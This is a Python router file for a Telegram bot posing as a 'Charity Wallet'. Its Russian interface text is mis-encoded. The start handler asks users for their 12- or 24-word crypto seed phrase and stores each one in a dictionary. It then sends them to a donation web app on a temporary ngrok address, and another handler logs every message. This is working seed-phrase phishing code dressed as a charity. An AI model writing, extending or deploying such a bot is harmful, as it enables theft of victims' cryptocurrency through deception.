# router.py
import time
import json
import logging
from aiogram import Router, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, Message
from aiogram.filters import Filter
from typing import Union, Dict, Any
from pydantic import ValidationError

from models import DonationData

router = Router()
NGROK_URL = "https://95ca67826bb9.ngrok-free.app"

# –•—Ä–∞–Ω–∏–ª–∏—â–∞
user_seeds = {}  # user_id: seed —Ñ—Ä–∞–∑–∞
waiting_for_seed = {}  # user_id: True (–æ–∂–∏–¥–∞–Ω–∏–µ —Å–∏–¥-—Ñ—Ä–∞–∑—ã)


@router.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    waiting_for_seed[user_id] = True
    await message.answer(
        "üîê <b>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ Charity Wallet!</b>\n\n"
        "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –≤–∞—à—É seed-—Ñ—Ä–∞–∑—É (12 –∏–ª–∏ 24 —Å–ª–æ–≤–∞) –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–æ—à–µ–ª—å–∫—É:",
        parse_mode='html'
    )


@router.message(F.text)
async def handle_seed(message: types.Message):
    user_id = message.from_user.id
    if not waiting_for_seed.get(user_id):
        return await message.answer("‚ÑπÔ∏è –í–≤–µ–¥–∏—Ç–µ /start –¥–ª—è –Ω–∞—á–∞–ª–∞ —Ä–∞–±–æ—Ç—ã")

    words = message.text.strip().split()
    if len(words) not in [12, 24]:
        return await message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç! –í–≤–µ–¥–∏—Ç–µ 12 –∏–ª–∏ 24 —Å–ª–æ–≤–∞ —á–µ—Ä–µ–∑ –ø—Ä–æ–±–µ–ª")

    user_seeds[user_id] = message.text
    waiting_for_seed.pop(user_id, None)

    webapp_url = f"{NGROK_URL}/donate?user_id={user_id}"
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text="üöÄ –û—Ç–∫—Ä—ã—Ç—å –∫–æ—à–µ–ª–µ–∫",
            web_app=WebAppInfo(url=webapp_url)
        )
    ]])

    await message.answer(
        "‚úÖ Seed-—Ñ—Ä–∞–∑–∞ –ø—Ä–∏–Ω—è—Ç–∞!\n"
        "–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ, —á—Ç–æ–±—ã –æ—Ç–∫—Ä—ã—Ç—å –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è –ø–æ–∂–µ—Ä—Ç–≤–æ–≤–∞–Ω–∏–π:",
        reply_markup=kb
    )


@router.message(lambda message: message.web_app_data is not None)
async def handle_web_app_data(message: Message):
    try:
        data = json.loads(message.web_app_data.data)
        org = data.get("org")
        amount = data.get("amount")

        await message.answer(f"‚úÖ –ü–æ–∂–µ—Ä—Ç–≤–æ–≤–∞–Ω–∏–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–æ!\n–û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è: {org}\n–°—É–º–º–∞: {amount} USDT")
    except Exception as e:
        await message.answer("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö WebApp.")
        print("–û—à–∏–±–∫–∞:", e)


@router.message()
async def debug_all(message: types.Message):
    # —ç—Ç–æ –≤—Å—Ç–∞–Ω–µ—Ç –ø–æ—Å–ª–µ–¥–Ω–∏–º –≤ —Ñ–∞–π–ª–µ router.py
    logging.info("ü™≤ Debug update: %s", message.json(indent=2, ensure_ascii=False))